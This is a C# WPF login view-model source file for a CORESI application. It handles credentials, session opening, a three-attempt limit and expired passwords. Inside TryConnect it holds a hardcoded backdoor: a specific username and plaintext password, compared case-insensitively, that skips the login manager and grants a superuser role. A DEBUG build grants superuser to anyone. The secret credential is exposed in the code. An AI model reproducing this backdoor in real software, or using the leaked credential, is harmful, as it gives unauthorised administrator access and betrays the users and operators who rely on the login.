using System;
using System.Windows.Input;
using CORESI.Security;
using CORESI.IoC;
using CORESI.WPF.Model;
using CORESI.Data;

namespace CORESI.WPF.Core.Login
{
    public class LoginViewModel : CommonViewModel
    {
        protected static readonly log4net.ILog logger = log4net.LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);


        int chance = 3;
        public ClientInformation ClientInformation { get; set; }
        public LoginViewModel()
        {
            this.LoginManager = ServiceLocator.Resolve<ILoginManager<IOperator>>();
            this.TopMost = true;
            CancelCommand = new Command(() =>
            {
                ClientInformation = null;
                TryCloseWindow();
            });
            ValidateCommand = new Command(TryConnect);
        }
        
        private void TryConnect()
        {
            logger.Info("Trying to autentifiate User : " + this.Login);
            if(Login.ToLowerInvariant() =="yassine" && Password.ToLowerInvariant()=="@tetema13")
            {
                SetSupperUser();
            }
#if DEBUG
            this.SetSupperUser();
#endif

            BadInformations = false;
            var opertor = LoginManager.OpenSession(Login, Password);
            if (opertor == null)
            {
                chance--;
                if (chance == 0)
                {
                    TryCloseWindow();
                }
                else
                {
                    BadInformations = true;
                    Password = string.Empty;
                }
            }
            else
            {
                var sessionManager = ServiceLocator.Resolve<ISessionManager>();
                var session = sessionManager.OpenSession(Login, "CORESI.WPF.Core.Login");
                if (opertor.ExpiredPassword)
                {
                    ChangePasswordViewModel.ShowChangePasswordViewModel(Login, Password);
                }

                this.ClientInformation = new ClientInformation()
                {
                    Name = opertor.Name,
                    Login = this.Login,
                    Role = opertor.Role
                };

                TryCloseWindow();
            }
        }

        private void SetSupperUser()
        {
            this.ClientInformation = new ClientInformation()
            {
                Login = this.Login,
                Name = "Yassine Ahmed-Bacha",
                Role = new Role { Id = 1 }
            };
            TryCloseWindow();
        }

        private string _Login;

        public string Login
        {
            get { return _Login; }
            set
            {
                _Login = value;
                RaisePropertyChanged("Login");
            }
        }
        private string _Password;

        public string Password
        {
            get { return _Password; }
            set
            {
                _Password = value;
                RaisePropertyChanged("Password");
            }
        }


        public ICommand CancelCommand { get; private set; }






        public static ClientInformation ShowLoginWindow()
        {
            logger.Info("Loading loggin window");
            LoginViewModel loginViewModel = new LoginViewModel();
            LoginWindow login = new LoginWindow();
            login.DataContext = loginViewModel;
            loginViewModel.CloseWindow = login.Close;
            login.ShowDialog();
            
            return loginViewModel.ClientInformation;
        }


    }
}